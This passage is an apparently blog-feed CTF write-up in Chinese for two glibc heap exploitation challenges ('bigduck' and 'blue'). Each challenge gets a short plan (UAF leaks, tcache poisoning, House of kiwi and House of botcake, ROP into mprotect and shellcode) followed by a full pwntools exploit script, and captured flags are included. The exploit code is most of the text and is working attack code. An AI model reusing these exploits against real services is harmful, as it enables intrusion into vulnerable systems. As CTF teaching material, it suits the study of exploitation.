class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1f2cc0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>helper = libc_base + <span class="hljs-number">0x1f45c0</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(stderr)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(system_addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># add()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bigduck"><a class="header-anchor" href="#bigduck">¶</a>bigduck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194814107.png" alt="image-20220619194814107"></p><p><strong>flag{afae47ead2452a4b5ba629ec88635a51}</strong></p><p>libc 2.33 下开了沙盒的堆题，其他部分和上题一样。</p><p><strong>思路</strong></p><ol><li>利用 UAF leak 堆地址，分配并 Dele 掉多个堆块 leak libc</li><li>分配 chunk 到 Tcache 的 entry 处，利用 Edit 函数我们可以控制任意分配堆块</li><li>House of kiwi 完成栈迁移，执行 shellcode 读取 flag</li></ol><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58011</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;u&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>sync = libc_base + <span class="hljs-number">0x1e24a0</span> + <span class="hljs-number">0x60</span><br>magic = libc_base + <span class="hljs-number">0x529ad</span><br>helper = libc_base + <span class="hljs-number">0x1e1940</span><br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span><br>addr = heap_base + <span class="hljs-number">0x400</span><br><br>mmp = flat([<br>    <span class="hljs-number">0</span>,rdi,((addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx,<span class="hljs-number">7</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,addr+<span class="hljs-number">0x400</span>,rdx,<span class="hljs-number">0x100</span>,libc.sym.read,libc_base + <span class="hljs-number">0x00000000000506b1</span><br>])<br><br>edit(<span class="hljs-number">0</span>,mmp)<br><span class="hljs-comment"># edit(1,mmp)</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x2a8</span>)+p64(ret))<br>edit(<span class="hljs-number">12</span>,p64(sync)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(magic))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># # add()</span><br>sleep(<span class="hljs-number">2</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x0000000000028a55 : pop rdi ; ret</span><br><span class="hljs-string">0x0000000000112a51 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000c7f32 : pop rdx ; ret</span><br><span class="hljs-string">0x0000000000095982 : pop rdx ; ret 0x11</span><br><span class="hljs-string">0x0000000000093342 : pop rdx ; ret 0xfffc</span><br><span class="hljs-string">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cf : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="hljs-string">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-string">0x000000000002a04c : pop rsp ; pop r13 ; ret</span><br><span class="hljs-string">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000033af2 : pop rsp ; ret</span><br><span class="hljs-string">0x0000000000026699 : ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="blue"><a class="header-anchor" href="#blue">¶</a>blue</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194659319.png" alt="image-20220619194659319"></p><p><strong>flag{8c65b8bd2169f2cf662ae9e324aaef66}</strong></p><p>Ubuntu GLIBC 2.31-0ubuntu9.8 的堆题，IO jumps 段不可写，没有办法按传统思路走。</p><p><strong>思路</strong></p><ol><li>利用后门函数，类似 House of botcake 的手法完成堆块重叠的同时 leak 出 libc。</li><li>攻击 Stdout Leak 栈地址</li><li>塞 ROP</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size=<span class="hljs-number">0x80</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Please input content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bkdoor</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">666</span>)<br>    sla(<span class="hljs-string">&#x27;Please input idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">10</span>-<span class="hljs-number">1</span>-i)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] House of botcake</span><br><span class="hljs-string">[*] Double Free --&gt; Modify chunk&#x27;s size --&gt; Chunk Overlapping</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>bkdoor(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>libc.address = libc_base<br>stdout = libc_base + <span class="hljs-number">0x1ed6a0</span><br>stack_addr = libc.sym.environ<br>ret = libc_base + <span class="hljs-number">0x0000000000022679</span><br>rdi = libc_base +<span class="hljs-number">0x0000000000023b6a</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002601f</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000119211</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000010d5dd</span><br><br>dele(<span class="hljs-number">0</span>)<br>add() <span class="hljs-comment"># 0</span><br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x88</span>+p32(<span class="hljs-number">0x90</span>*<span class="hljs-number">8</span>+<span class="hljs-number">1</span>)) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment"># 4</span><br>dele(<span class="hljs-number">1</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poisoning --&gt; Hijack Stdout --&gt; leak environ addr</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stdout)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x80</span>,p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(stack_addr)+p64(stack_addr+<span class="hljs-number">8</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment"># 6</span><br>stack_addr = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>lg(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Tcache Poinsoning --&gt; Hijack Stack --&gt; ROP --&gt; Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">5</span>)<br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x50</span>,<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x91</span>)+p64(stack_addr-<span class="hljs-number">0x120</span>)+p64(<span class="hljs-number">0</span>)) <span class="hljs-comment"># 2</span><br>add() <span class="hljs-comment"># 5</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[~] Gets to input more data (Optional)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = flat([<br>    rdi,stack_addr-<span class="hljs-number">0x108</span>,libc.sym.gets<br>])<br>add(<span class="hljs-number">0x80</span>,payload) <span class="hljs-comment"># 7</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[*] Enable Shellcode</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>mmp = flat([<br>    rdi,((stack_addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx_r12,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,stack_addr,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,libc.sym.read,jmp_rsi<br>])<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(mmp)<br>sleep(<span class="hljs-number">0.5</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【EP.02】_IO_FILE 艺术鉴赏</title>
    <link href="/posts/13285c73.html"/>
    <url>/posts/13285c73.html</url>
    
